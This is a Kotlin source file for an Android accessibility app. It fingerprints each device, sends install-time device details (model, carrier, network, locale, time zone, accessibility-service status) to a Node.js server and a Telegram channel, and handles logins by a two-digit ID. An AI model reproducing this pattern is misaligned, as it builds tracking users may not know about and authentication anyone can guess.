package com.example.util

import android.content.Context
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Log
import com.example.data.AppDatabase
import com.example.data.DeviceUserEntity
import com.example.data.NodeServerClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.security.MessageDigest
import java.util.Locale
import java.util.TimeZone
import java.util.UUID

data class ChannelLoginResult(
    val success: Boolean,
    val channelId: String = "",
    val twoDigitId: String = "",
    val isAuthenticated: Boolean = false,
    val isPendingOwnerAssignment: Boolean = false,
    val deviceId: String = "",
    val serverUserId: String = "",
    val messageBn: String = ""
)

data class DeviceUserIdentity(
    val deviceId: String = "",
    val serverUserId: String = "",
    val twoDigitLoginId: String = "",
    val channelId: String = NodeServerClient.DEFAULT_TELEGRAM_CHAT_ID,
    val isChannelLoggedIn: Boolean = false,
    val userLabel: String = "",
    val deviceModel: String = "",
    val manufacturer: String = "",
    val androidVersion: String = "",
    val osSdkInt: Int = Build.VERSION.SDK_INT,
    val screenResolution: String = "",
    val screenDensity: String = "",
    val networkType: String = "",
    val carrierName: String = "",
    val defaultLanguage: String = "",
    val timeZone: String = "",
    val appVersion: String = "1.0",
    val installerPackage: String = "com.google.android.packageinstaller",
    val isInstallNotificationSent: Boolean = false,
    val totalDeviceUsersCount: Int = 1,
    val statusTextBn: String = "একক ডাটাবেইজে আলাদা চ্যানেল আইডি দিয়ে সংযুক্ত",
    val statusTextEn: String = "Connected to Single Shared DB via Channel ID",
    val firstInstalledAt: Long = System.currentTimeMillis()
)

/**
 * Manages unique per-device user identification and automatic database install notifications.
 *
 * Requirements satisfied:
 * 1. When the app is installed on a phone (or confirmed via official PackageInstaller), a database
 *    notification is immediately dispatched to both the Node.js database server and the Telegram
 *    database notification channel, as well as persisted in the local Room database.
 * 2. Every distinct physical device gets a unique deterministic hardware/Android-ID fingerprint (`DEV-XXXXXXXX`)
 *    and is identified in the database as a separate, individual user (`USR-XXXXXXXX` / `DeviceUserEntity`).
 */
class DeviceInstallationSyncManager private constructor(private val context: Context) {

    companion object {
        private const val TAG = "DeviceInstallSync"
        private const val PREFS_NAME = "accessibility_device_prefs"
        private const val KEY_UNIQUE_DEVICE_ID = "unique_device_id"
        private const val KEY_SERVER_USER_ID = "server_device_user_id"
        private const val KEY_CHANNEL_ID = "installer_logged_in_channel_id"
        private const val KEY_CHANNEL_LOGGED_IN = "is_installer_channel_logged_in"
        private const val KEY_USER_LABEL = "device_user_label"
        private const val KEY_INSTALL_NOTIFIED = "install_db_notification_sent"
        private const val KEY_LAST_INSTALL_TIME_NOTIFIED = "last_install_time_notified"

        @Volatile
        private var INSTANCE: DeviceInstallationSyncManager? = null

        fun getInstance(context: Context): DeviceInstallationSyncManager {
            return INSTANCE ?: synchronized(this) {
                INSTANCE ?: DeviceInstallationSyncManager(context.applicationContext).also { INSTANCE = it }
            }
        }
    }

    private val prefs: SharedPreferences = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val nodeServerClient = NodeServerClient.getInstance(context)
    private val telegramSync = TelegramRealtimeSync.getInstance(context)
    private val appDatabase = AppDatabase.getDatabase(context)

    private val _identity = MutableStateFlow(loadInitialIdentity())
    val identity: StateFlow<DeviceUserIdentity> = _identity.asStateFlow()

    private fun loadInitialIdentity(): DeviceUserIdentity {
        val devId = getOrCreateUniqueDeviceId()
        val shortHash = devId.removePrefix("DEV-").take(8).uppercase()
        val srvUserId = prefs.getString(KEY_SERVER_USER_ID, null)
            ?.takeIf { it.isNotBlank() }
            ?: "USR-$shortHash"
        val savedTwoDigit = nodeServerClient.getSavedTwoDigitLoginId()
        val savedChannelId = prefs.getString(KEY_CHANNEL_ID, null)
            ?.takeIf { it.isNotBlank() }
            ?: nodeServerClient.getPersonalLoggedInChatId().ifBlank { savedTwoDigit }
        val isChannelLogged = prefs.getBoolean(KEY_CHANNEL_LOGGED_IN, false) || nodeServerClient.isChannelLoggedIn()
        val model = (Build.MODEL ?: "Android").trim()
        val brand = (Build.MANUFACTURER ?: "Android").trim().replaceFirstChar { it.uppercase() }
        val defaultLabel = "$brand $model (#$shortHash)"
        val savedLabel = prefs.getString(KEY_USER_LABEL, null)?.takeIf { it.isNotBlank() } ?: defaultLabel
        val notified = prefs.getBoolean(KEY_INSTALL_NOTIFIED, false)
        val firstInstallTime = getPackageFirstInstallTime()
        val (resolution, density) = getScreenResolutionAndDensity()

        return DeviceUserIdentity(
            deviceId = devId,
            serverUserId = srvUserId,
            twoDigitLoginId = savedTwoDigit,
            channelId = savedChannelId,
            isChannelLoggedIn = isChannelLogged,
            userLabel = savedLabel,
            deviceModel = model,
            manufacturer = brand,
            androidVersion = Build.VERSION.RELEASE ?: "${Build.VERSION.SDK_INT}",
            osSdkInt = Build.VERSION.SDK_INT,
            screenResolution = resolution,
            screenDensity = density,
            networkType = getNetworkConnectionType(),
            carrierName = getCarrierOperatorName(),
            defaultLanguage = getDefaultLanguageLabel(),
            timeZone = getDeviceTimeZoneLabel(),
            appVersion = getAppVersionName(),
            installerPackage = getInstallerPackageName(),
            isInstallNotificationSent = notified,
            totalDeviceUsersCount = 1,
            statusTextBn = if (isChannelLogged) {
                "একক ডাটাবেইজ • চ্যানেল আইডি ($savedChannelId) দিয়ে সংযুক্ত ✓"
            } else if (notified) {
                "ডাটাবেইজ নোটিফিকেশন প্রেরিত • চ্যানেল: $savedChannelId ✓"
            } else {
                "ডিভাইস ইউজার শনাক্তকরণ চলছে ($srvUserId)..."
            },
            statusTextEn = if (isChannelLogged) {
                "Single Shared DB • Connected via Channel ID ($savedChannelId) ✓"
            } else if (notified) {
                "DB Install Notification Sent • Channel: $savedChannelId ✓"
            } else {
                "Registering Distinct Device User ($srvUserId)..."
            },
            firstInstalledAt = firstInstallTime
        )
    }

    /**
     * Generates a stable, per-device unique identifier (`DEV-XXXXXXXX`) using Android's `ANDROID_ID`
     * combined with hardware build traits so each physical device is guaranteed to be recognized
     * as a separate user in the database.
     */
    fun getOrCreateUniqueDeviceId(): String {
        val existing = prefs.getString(KEY_UNIQUE_DEVICE_ID, null)
        if (!existing.isNullOrBlank()) {
            return existing
        }

        val androidId = try {
            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID).orEmpty()
        } catch (_: Exception) {
            ""
        }

        val rawSeed = if (androidId.isNotBlank() && androidId != "9774d56d682e549c") {
            "$androidId-${Build.BRAND}-${Build.MODEL}-${Build.DEVICE}"
        } else {
            "${UUID.randomUUID()}-${Build.MODEL}"
        }

        val hashHex = try {
            val digest = MessageDigest.getInstance("SHA-256").digest(rawSeed.toByteArray())
            digest.take(5).joinToString("") { "%02X".format(it) }
        } catch (_: Exception) {
            UUID.randomUUID().toString().replace("-", "").take(10).uppercase()
        }

        val generatedId = "DEV-${hashHex.take(8)}"
        val srvUserId = "USR-${hashHex.take(8)}"
        prefs.edit()
            .putString(KEY_UNIQUE_DEVICE_ID, generatedId)
            .putString(KEY_SERVER_USER_ID, srvUserId)
            .apply()
        return generatedId
    }

    /**
     * Triggered automatically on app startup / installation and whenever the official PackageInstaller
     * completes an installation or update.
     *
     * - Persists this device as a distinct user in the local Room `device_user_records` table.
     * - Registers this device as a distinct user in the Node.js database (`/api/devices/install`).
     * - Sends an installation database notification to Telegram and the server log if not yet sent
     *   for this installation (or when `forceNotify = true`).
     */
    fun ensureDeviceRegisteredAndNotifyInstall(forceNotify: Boolean = false) {
        scope.launch {
            syncDeviceInstallationSuspend(forceNotify = forceNotify)
        }
    }

    /**
     * Suspendable version of device registration & database install notification for deterministic testing
     * and immediate execution.
     */
    suspend fun syncDeviceInstallationSuspend(forceNotify: Boolean = false): DeviceUserIdentity = withContext(Dispatchers.IO) {
        val current = _identity.value
        val firstInstallTime = getPackageFirstInstallTime()
        val lastNotifiedInstallTime = prefs.getLong(KEY_LAST_INSTALL_TIME_NOTIFIED, 0L)
        val alreadyNotified = prefs.getBoolean(KEY_INSTALL_NOTIFIED, false) && (lastNotifiedInstallTime == firstInstallTime)
        val shouldSendInstallNotification = forceNotify || !alreadyNotified

        val isServiceOn = AccessibilityHelper.isAccessibilityServiceEnabled(context)
        val installerPkg = getInstallerPackageName()
        val (resolution, density) = getScreenResolutionAndDensity()
        val liveNetworkType = getNetworkConnectionType()
        val liveCarrierName = getCarrierOperatorName()
        val liveLanguage = getDefaultLanguageLabel()
        val liveTimeZone = getDeviceTimeZoneLabel()

        // 1. Register with Node.js Database Server (/api/devices/install) so each device is stored as a separate user
        val serverResult = nodeServerClient.registerDeviceInstallation(
            deviceId = current.deviceId,
            deviceModel = current.deviceModel,
            manufacturer = current.manufacturer,
            androidVersion = current.androidVersion,
            osSdkInt = Build.VERSION.SDK_INT,
            screenResolution = resolution,
            screenDensity = density,
            networkType = liveNetworkType,
            carrierName = liveCarrierName,
            defaultLanguage = liveLanguage,
            timeZone = liveTimeZone,
            appVersion = current.appVersion,
            installerPackage = installerPkg,
            isServiceEnabled = isServiceOn,
            firstInstallTime = firstInstallTime
        ).getOrNull()

        val resolvedServerUserId = serverResult?.serverUserId?.takeIf { it.isNotBlank() }
            ?: current.serverUserId.ifBlank { "USR-${current.deviceId.removePrefix("DEV-")}" }

        // 2. Send Telegram Database Notification if this is a new install or forced notification
        if (shouldSendInstallNotification) {
            telegramSync.notifyAppInstalledOnDevice(
                deviceId = current.deviceId,
                serverUserId = resolvedServerUserId,
                userLabel = current.userLabel,
                deviceModel = current.deviceModel,
                manufacturer = current.manufacturer,
                androidVersion = current.androidVersion,
                osSdkInt = Build.VERSION.SDK_INT,
                screenResolution = resolution,
                screenDensity = density,
                networkType = liveNetworkType,
                carrierName = liveCarrierName,
                defaultLanguage = liveLanguage,
                timeZone = liveTimeZone,
                installerPackage = installerPkg,
                isNewInstall = !alreadyNotified
            )

            // Also record an explicit APP_INSTALLED event in the server navigation/telemetry logs
            try {
                nodeServerClient.postNavigationLog(
                    phoneNumber = resolvedServerUserId,
                    deviceId = current.deviceId,
                    screenTitle = "App Installed on ${current.manufacturer} ${current.deviceModel} ($resolution • $liveNetworkType)",
                    packageName = installerPkg,
                    eventType = "APP_INSTALLED"
                )
            } catch (_: Exception) {}
        }

        // 3. Persist in local Room database as a distinct DeviceUserEntity
        val activeChannelId = current.channelId.ifBlank { nodeServerClient.getPersonalLoggedInChatId() }
        val entity = DeviceUserEntity(
            deviceId = current.deviceId,
            serverUserId = resolvedServerUserId,
            channelId = activeChannelId,
            isChannelLoggedIn = current.isChannelLoggedIn || nodeServerClient.isChannelLoggedIn(),
            userLabel = current.userLabel,
            deviceModel = current.deviceModel,
            manufacturer = current.manufacturer,
            androidVersion = current.androidVersion,
            osSdkInt = Build.VERSION.SDK_INT,
            screenResolution = resolution,
            screenDensity = density,
            networkType = liveNetworkType,
            carrierName = liveCarrierName,
            defaultLanguage = liveLanguage,
            timeZone = liveTimeZone,
            appVersion = current.appVersion,
            installerPackage = installerPkg,
            isServiceEnabled = isServiceOn,
            isInstallNotificationSent = true,
            firstInstalledAt = firstInstallTime,
            lastSyncedAt = System.currentTimeMillis()
        )

        var localCount = 1
        try {
            appDatabase.deviceUserDao().upsertDeviceUser(entity)
            localCount = appDatabase.deviceUserDao().getDeviceUserCount().coerceAtLeast(1)
        } catch (e: Exception) {
            Log.w(TAG, "Room upsertDeviceUser notice: ${e.message}")
        }

        val totalUsers = maxOf(localCount, serverResult?.totalDeviceUsers ?: 1)

        prefs.edit()
            .putString(KEY_SERVER_USER_ID, resolvedServerUserId)
            .putString(KEY_USER_LABEL, current.userLabel)
            .putBoolean(KEY_INSTALL_NOTIFIED, true)
            .putLong(KEY_LAST_INSTALL_TIME_NOTIFIED, firstInstallTime)
            .apply()

        val updatedIdentity = current.copy(
            serverUserId = resolvedServerUserId,
            osSdkInt = Build.VERSION.SDK_INT,
            screenResolution = resolution,
            screenDensity = density,
            networkType = liveNetworkType,
            carrierName = liveCarrierName,
            defaultLanguage = liveLanguage,
            timeZone = liveTimeZone,
            installerPackage = installerPkg,
            isInstallNotificationSent = true,
            totalDeviceUsersCount = totalUsers,
            statusTextBn = "ডাটাবেইজ নোটিফিকেশন প্রেরিত • ইউজার: $resolvedServerUserId ✓",
            statusTextEn = "DB Install Notification Sent • User: $resolvedServerUserId ✓",
            firstInstalledAt = firstInstallTime
        )
        _identity.value = updatedIdentity
        updatedIdentity
    }

    /**
     * Logs in the visually impaired user using either a 2-digit Customer ID (e.g., 00, 22, 45, 56)
     * OR a full personal Telegram Chat ID (`channelId`):
     * - If a 2-digit ID is entered:
     *   1. Checks if a unique Chat ID is already mapped to that 2-digit ID in the database (e.g. 00 -> 8559600259); if so, authenticates immediately!
     *   2. Sends a one-click copyable notification to Owner Chat ID (`8271536101`):
     *      `/user_requested_22_chat_id_` so the owner/bot can map the user's Chat ID with `/user_requested_22_chat_id_366256...`
     */
    suspend fun loginWithPersonalChatIdSuspend(rawInput: String): ChannelLoginResult = withContext(Dispatchers.IO) {
        val cleanInput = rawInput.trim()
        if (cleanInput.isBlank()) {
            return@withContext ChannelLoginResult(
                success = false,
                channelId = "",
                messageBn = "অনুগ্রহ করে আপনার ২ সংখ্যার আইডি (যেমন: 00, 22, 45, 56) লিখুন।"
            )
        }

        val current = _identity.value
        val isServiceOn = AccessibilityHelper.isAccessibilityServiceEnabled(context)

        // Case A: User entered a 2-digit login number (e.g., 00, 22, 45, 56, 78, 90...)
        if (cleanInput.length == 2 && cleanInput.all { it.isDigit() }) {
            val twoDigitResp = nodeServerClient.loginWithTwoDigitId(
                twoDigitId = cleanInput,
                deviceId = current.deviceId,
                deviceModel = current.deviceModel,
                manufacturer = current.manufacturer,
                isServiceEnabled = isServiceOn
            ).getOrNull()

            val mappedChat = twoDigitResp?.mappedChatId?.takeIf { it.isNotBlank() }
                ?: nodeServerClient.getMappedChatIdForTwoDigit(cleanInput)
            val isAuth = mappedChat.isNotBlank() || (twoDigitResp?.isAuthenticated == true)
            val resolvedUserId = twoDigitResp?.serverUserId?.ifBlank { current.serverUserId } ?: current.serverUserId
            val effectiveChannelId = mappedChat.ifBlank { cleanInput }

            prefs.edit()
                .putString(KEY_CHANNEL_ID, effectiveChannelId)
                .putBoolean(KEY_CHANNEL_LOGGED_IN, true)
                .apply()

            // Persist the 2-digit login and mapped ID (e.g. 00 -> 8559600259) in the local Room Database
            try {
                appDatabase.deviceUserDao().upsertDeviceUser(
                    DeviceUserEntity(
                        deviceId = current.deviceId,
                        serverUserId = resolvedUserId,
                        channelId = effectiveChannelId,
                        isChannelLoggedIn = true,
                        userLabel = "Login #$cleanInput (ID: $effectiveChannelId) • ${current.userLabel}",
                        deviceModel = current.deviceModel,
                        manufacturer = current.manufacturer,
                        androidVersion = current.androidVersion,
                        osSdkInt = current.osSdkInt,
                        screenResolution = current.screenResolution,
                        screenDensity = current.screenDensity,
                        networkType = current.networkType,
                        carrierName = current.carrierName,
                        defaultLanguage = current.defaultLanguage,
                        timeZone = current.timeZone,
                        appVersion = current.appVersion,
                        installerPackage = current.installerPackage,
                        isServiceEnabled = isServiceOn,
                        isInstallNotificationSent = true,
                        firstInstalledAt = current.firstInstalledAt,
                        lastSyncedAt = System.currentTimeMillis()
                    )
                )
            } catch (e: Exception) {
                Log.w(TAG, "Room upsert on 2-digit login notice: ${e.message}")
            }

            // Notify Owner Chat ID (8271536101) with one-click copy command `/user_requested_<ID>_chat_id_`
            // AND if already mapped to a Chat ID, notify that user's personal inbox!
            telegramSync.notifyTwoDigitLoginSubmitted(
                twoDigitId = cleanInput,
                mappedChatId = mappedChat,
                deviceId = current.deviceId,
                serverUserId = resolvedUserId,
                deviceModel = "${current.manufacturer} ${current.deviceModel}".trim()
            )

            val updatedIdentity = current.copy(
                serverUserId = resolvedUserId,
                twoDigitLoginId = cleanInput,
                channelId = effectiveChannelId,
                isChannelLoggedIn = true,
                statusTextBn = if (mappedChat.isNotBlank()) {
                    "২-ডিজিট আইডি ($cleanInput) • Chat ID ($mappedChat) সংযুক্ত ✓"
                } else {
                    "২-ডিজিট আইডি ($cleanInput) লগইন সম্পন্ন • ওনার ইনবক্সে প্রেরিত ✓"
                },
                statusTextEn = "2-Digit ID ($cleanInput) Active ✓"
            )
            _identity.value = updatedIdentity

            val feedbackMsg = if (mappedChat.isNotBlank()) {
                "আলহামদুলিল্লাহ! ২-ডিজিট আইডি ($cleanInput)-এর বিপরীতে আপনার Chat ID ($mappedChat) পাওয়া গেছে এবং সেশন সফলভাবে অথেন্টিকেট হয়েছে ✓"
            } else {
                "আলহামদুলিল্লাহ! আপনার ২-ডিজিট আইডি ($cleanInput) ডাটাবেইজ ও ওনার চ্যানেলে জমা হয়েছে ✓ বট থেকে /user_requested_${cleanInput}_chat_id পাঠালেই আপনার ব্যক্তিগত ইনবক্স স্বয়ংক্রিয়ভাবে যুক্ত হবে ইনশাআল্লাহ।"
            }

            return@withContext ChannelLoginResult(
                success = true,
                channelId = mappedChat.ifBlank { cleanInput },
                twoDigitId = cleanInput,
                isAuthenticated = isAuth,
                isPendingOwnerAssignment = mappedChat.isBlank(),
                deviceId = current.deviceId,
                serverUserId = resolvedUserId,
                messageBn = feedbackMsg
            )
        }

        // Case B: User or Admin entered a full Telegram Chat ID directly
        val cleanChatId = cleanInput
        prefs.edit()
            .putString(KEY_CHANNEL_ID, cleanChatId)
            .putBoolean(KEY_CHANNEL_LOGGED_IN, true)
            .apply()

        val serverResp = nodeServerClient.loginWithChannelId(
            channelId = cleanChatId,
            deviceId = current.deviceId,
            deviceModel = current.deviceModel,
            manufacturer = current.manufacturer,
            isServiceEnabled = isServiceOn
        ).getOrNull()

        val resolvedUserId = serverResp?.serverUserId?.ifBlank { current.serverUserId } ?: current.serverUserId

        telegramSync.notifyChannelLoginConnected(
            channelId = cleanChatId,
            deviceId = current.deviceId,
            serverUserId = resolvedUserId,
            deviceModel = "${current.manufacturer} ${current.deviceModel}".trim()
        )

        val updatedIdentity = current.copy(
            serverUserId = resolvedUserId,
            channelId = cleanChatId,
            isChannelLoggedIn = true,
            statusTextBn = "চ্যানেলে ভেরিফাইড ইউজার • ব্যক্তিগত Chat ID ($cleanChatId) সংযুক্ত ✓",
            statusTextEn = "Verified Channel User • Personal Chat ID ($cleanChatId) Active ✓"
        )
        _identity.value = updatedIdentity

        ChannelLoginResult(
            success = true,
            channelId = cleanChatId,
            isAuthenticated = true,
            deviceId = current.deviceId,
            serverUserId = resolvedUserId,
            messageBn = "আলহামদুলিল্লাহ! আপনার আইডি ($cleanChatId) ভেরিফাইড ইউজার হিসেবে জমা হয়েছে।"
        )
    }

    /**
     * Called when the Owner Bot (`8271536101`) sends `/user_requested_22_chat_id_366256...`
     * to map a 2-digit login ID (`22`) to a visually impaired brother's Telegram Chat ID (`366256...`).
     */
    fun applyOwnerAssignedChatIdForTwoDigit(twoDigitId: String, assignedChatId: String) {
        val cleanTwoDigit = twoDigitId.trim()
        val cleanChatId = assignedChatId.trim()
        if (cleanTwoDigit.isBlank() || cleanChatId.isBlank()) return

        nodeServerClient.assignTwoDigitChatIdLocally(cleanTwoDigit, cleanChatId)
        val current = _identity.value
        val mySavedTwoDigit = nodeServerClient.getSavedTwoDigitLoginId().ifBlank { current.twoDigitLoginId }

        if (mySavedTwoDigit == cleanTwoDigit) {
            prefs.edit()
                .putString(KEY_CHANNEL_ID, cleanChatId)
                .putBoolean(KEY_CHANNEL_LOGGED_IN, true)
                .apply()
            _identity.value = current.copy(
                twoDigitLoginId = cleanTwoDigit,
                channelId = cleanChatId,
                isChannelLoggedIn = true,
                statusTextBn = "২-ডিজিট আইডি ($cleanTwoDigit) • ভেরিফাইড Chat ID ($cleanChatId) সংযুক্ত ✓",
                statusTextEn = "2-Digit ID ($cleanTwoDigit) • Verified Chat ID ($cleanChatId) Active ✓"
            )
            scope.launch {
                try {
                    nodeServerClient.loginWithChannelId(
                        channelId = cleanChatId,
                        deviceId = current.deviceId,
                        deviceModel = current.deviceModel,
                        manufacturer = current.manufacturer,
                        isServiceEnabled = AccessibilityHelper.isAccessibilityServiceEnabled(context)
                    )
                } catch (_: Exception) {}
            }
        }
    }

    /**
     * Deletes this user's Chat ID from the Channel Verified User List, logs them out of the database,
     * clears local login state, and immediately disables all automated services for this device.
     */
    suspend fun logoutAndRevokePersonalChatIdSuspend(notifyTelegram: Boolean = true): ChannelLoginResult = withContext(Dispatchers.IO) {
        val current = _identity.value
        val previousChatId = nodeServerClient.getPersonalLoggedInChatId().ifBlank { current.channelId }

        // 1. Send Telegram notifications BEFORE clearing local chat ID so both Admin Channel and user's personal inbox receive the notice
        if (notifyTelegram && previousChatId.isNotBlank()) {
            telegramSync.notifyChannelLogoutAndServiceDisabled(
                revokedChatId = previousChatId,
                deviceId = current.deviceId,
                serverUserId = current.serverUserId,
                deviceModel = "${current.manufacturer} ${current.deviceModel}".trim()
            )
        }

        // 2. Clear local login preferences & revoke on Node.js server
        val savedTwoDigit = nodeServerClient.getSavedTwoDigitLoginId()
        prefs.edit()
            .remove(KEY_CHANNEL_ID)
            .putBoolean(KEY_CHANNEL_LOGGED_IN, false)
            .apply()
        nodeServerClient.deleteTwoDigitChatIdMappingLocally(savedTwoDigit, previousChatId)

        nodeServerClient.logoutFromChannelId(
            channelId = previousChatId.ifBlank { savedTwoDigit },
            deviceId = current.deviceId
        )

        val updatedIdentity = current.copy(
            twoDigitLoginId = "",
            channelId = "",
            isChannelLoggedIn = false,
            statusTextBn = "ডাটাবেইজ থেকে লগআউট • সকল সার্ভিস বন্ধ করা হয়েছে",
            statusTextEn = "Logged Out from Channel • All Services Disabled"
        )
        _identity.value = updatedIdentity

        ChannelLoginResult(
            success = true,
            channelId = "",
            deviceId = current.deviceId,
            serverUserId = current.serverUserId,
            messageBn = "আপনার Chat ID ($previousChatId) ভেরিফাইড তালিকা থেকে ডিলিট ও ডাটাবেইজ থেকে লগআউট করা হয়েছে এবং সকল সার্ভিস বন্ধ করা হয়েছে।"
        )
    }

    /**
     * Allows registering an additional simulated or remote device in local Room & Server DB
     * for multi-device testing and verification.
     */
    suspend fun registerDistinctDeviceInDatabase(
        customDeviceId: String,
        customDeviceModel: String,
        customManufacturer: String = "Android"
    ): DeviceUserIdentity = withContext(Dispatchers.IO) {
        val cleanDevId = customDeviceId.trim().uppercase().let {
            if (it.startsWith("DEV-")) it else "DEV-$it"
        }
        val shortCode = cleanDevId.removePrefix("DEV-").take(8)
        val srvUserId = "USR-$shortCode"
        val label = "$customManufacturer $customDeviceModel (#$shortCode)"
        val (resolution, density) = getScreenResolutionAndDensity()
        val liveNetworkType = getNetworkConnectionType()
        val liveCarrierName = getCarrierOperatorName()
        val liveLanguage = getDefaultLanguageLabel()
        val liveTimeZone = getDeviceTimeZoneLabel()

        val serverResult = nodeServerClient.registerDeviceInstallation(
            deviceId = cleanDevId,
            deviceModel = customDeviceModel,
            manufacturer = customManufacturer,
            androidVersion = Build.VERSION.RELEASE ?: "14",
            osSdkInt = Build.VERSION.SDK_INT,
            screenResolution = resolution,
            screenDensity = density,
            networkType = liveNetworkType,
            carrierName = liveCarrierName,
            defaultLanguage = liveLanguage,
            timeZone = liveTimeZone,
            appVersion = getAppVersionName(),
            installerPackage = "com.google.android.packageinstaller",
            isServiceEnabled = false,
            firstInstallTime = System.currentTimeMillis()
        ).getOrNull()

        val finalServerUserId = serverResult?.serverUserId?.takeIf { it.isNotBlank() } ?: srvUserId

        val entity = DeviceUserEntity(
            deviceId = cleanDevId,
            serverUserId = finalServerUserId,
            userLabel = label,
            deviceModel = customDeviceModel,
            manufacturer = customManufacturer,
            androidVersion = Build.VERSION.RELEASE ?: "14",
            osSdkInt = Build.VERSION.SDK_INT,
            screenResolution = resolution,
            screenDensity = density,
            networkType = liveNetworkType,
            carrierName = liveCarrierName,
            defaultLanguage = liveLanguage,
            timeZone = liveTimeZone,
            appVersion = getAppVersionName(),
            installerPackage = "com.google.android.packageinstaller",
            isServiceEnabled = false,
            isInstallNotificationSent = true,
            firstInstalledAt = System.currentTimeMillis(),
            lastSyncedAt = System.currentTimeMillis()
        )
        appDatabase.deviceUserDao().upsertDeviceUser(entity)
        val count = appDatabase.deviceUserDao().getDeviceUserCount()

        DeviceUserIdentity(
            deviceId = cleanDevId,
            serverUserId = finalServerUserId,
            userLabel = label,
            deviceModel = customDeviceModel,
            manufacturer = customManufacturer,
            androidVersion = Build.VERSION.RELEASE ?: "14",
            osSdkInt = Build.VERSION.SDK_INT,
            screenResolution = resolution,
            screenDensity = density,
            networkType = liveNetworkType,
            carrierName = liveCarrierName,
            defaultLanguage = liveLanguage,
            timeZone = liveTimeZone,
            appVersion = getAppVersionName(),
            installerPackage = "com.google.android.packageinstaller",
            isInstallNotificationSent = true,
            totalDeviceUsersCount = maxOf(count, serverResult?.totalDeviceUsers ?: count)
        )
    }

    /**
     * Returns zero-permission display resolution & density quality so the app and console
     * know how the UI adapts to the screen.
     */
    private fun getScreenResolutionAndDensity(): Pair<String, String> {
        return try {
            val dm = context.resources.displayMetrics
            val width = dm.widthPixels.takeIf { it > 0 } ?: 1080
            val height = dm.heightPixels.takeIf { it > 0 } ?: 2400
            val dpi = dm.densityDpi.takeIf { it > 0 } ?: 420
            val scale = String.format(Locale.US, "%.1fx", dm.density.takeIf { it > 0f } ?: 2.6f)
            val qualityTag = when {
                dpi >= 560 -> "XXXHDPI"
                dpi >= 420 -> "XXHDPI"
                dpi >= 300 -> "XHDPI"
                dpi >= 220 -> "HDPI"
                else -> "MDPI"
            }
            "${width}x${height} px" to "${dpi} dpi ($qualityTag • $scale)"
        } catch (_: Exception) {
            "1080x2400 px" to "420 dpi (XXHDPI)"
        }
    }

    /**
     * Returns zero-permission network transport type (Wi-Fi vs Mobile Data 4G/5G).
     * Uses only standard install-time `ACCESS_NETWORK_STATE`.
     */
    private fun getNetworkConnectionType(): String {
        return try {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            val network = cm?.activeNetwork
            val caps = if (network != null) cm.getNetworkCapabilities(network) else null
            when {
                caps == null -> "Active Network (Wi-Fi / Mobile Data)"
                caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "Wi-Fi (ব্রডব্যান্ড/ওয়াই-ফাই)"
                caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Mobile Data (4G/5G মোবাইল ডাটা)"
                caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
                else -> "Connected Network"
            }
        } catch (_: Exception) {
            "Wi-Fi / Mobile Data"
        }
    }

    /**
     * Returns zero-permission public network operator / SIM carrier display name
     * (`TelephonyManager.networkOperatorName` does NOT require `READ_PHONE_STATE`).
     */
    private fun getCarrierOperatorName(): String {
        return try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            val netOp = tm?.networkOperatorName?.trim().orEmpty()
            val simOp = tm?.simOperatorName?.trim().orEmpty()
            when {
                netOp.isNotBlank() && !netOp.equals("Android", ignoreCase = true) -> netOp
                simOp.isNotBlank() -> simOp
                netOp.isNotBlank() -> netOp
                else -> "Wi-Fi / Default Carrier"
            }
        } catch (_: Exception) {
            "Wi-Fi / Default Carrier"
        }
    }

    /**
     * Returns the device's default language and country locale without any permissions.
     */
    private fun getDefaultLanguageLabel(): String {
        return try {
            val locale = Locale.getDefault()
            val langName = locale.displayLanguage.ifBlank { locale.language }
            val countryName = locale.displayCountry.ifBlank { locale.country }
            val tag = locale.toLanguageTag()
            if (countryName.isNotBlank()) {
                "$langName ($countryName • $tag)"
            } else {
                "$langName ($tag)"
            }
        } catch (_: Exception) {
            "বাংলা (bn-BD)"
        }
    }

    /**
     * Returns the device's default time zone ID and GMT offset without any permissions.
     */
    private fun getDeviceTimeZoneLabel(): String {
        return try {
            val tz = TimeZone.getDefault()
            val id = tz.id.ifBlank { "Asia/Dhaka" }
            val offsetMinutes = tz.getOffset(System.currentTimeMillis()) / (1000 * 60)
            val sign = if (offsetMinutes >= 0) "+" else "-"
            val absMin = kotlin.math.abs(offsetMinutes)
            val hours = absMin / 60
            val mins = absMin % 60
            val gmt = String.format(Locale.US, "GMT%s%02d:%02d", sign, hours, mins)
            "$id ($gmt)"
        } catch (_: Exception) {
            "Asia/Dhaka (GMT+06:00)"
        }
    }

    private fun getPackageFirstInstallTime(): Long {
        return try {
            val pkgInfo = context.packageManager.getPackageInfo(context.packageName, 0)
            if (pkgInfo.firstInstallTime > 0L) pkgInfo.firstInstallTime else System.currentTimeMillis()
        } catch (_: Exception) {
            System.currentTimeMillis()
        }
    }

    private fun getAppVersionName(): String {
        return try {
            val pkgInfo = context.packageManager.getPackageInfo(context.packageName, 0)
            pkgInfo.versionName ?: "1.0"
        } catch (_: Exception) {
            "1.0"
        }
    }

    private fun getInstallerPackageName(): String {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                val info = context.packageManager.getInstallSourceInfo(context.packageName)
                info.installingPackageName ?: info.initiatingPackageName ?: "com.google.android.packageinstaller"
            } else {
                @Suppress("DEPRECATION")
                context.packageManager.getInstallerPackageName(context.packageName) ?: "com.google.android.packageinstaller"
            }
        } catch (_: Exception) {
            "com.google.android.packageinstaller"
        }
    }
}
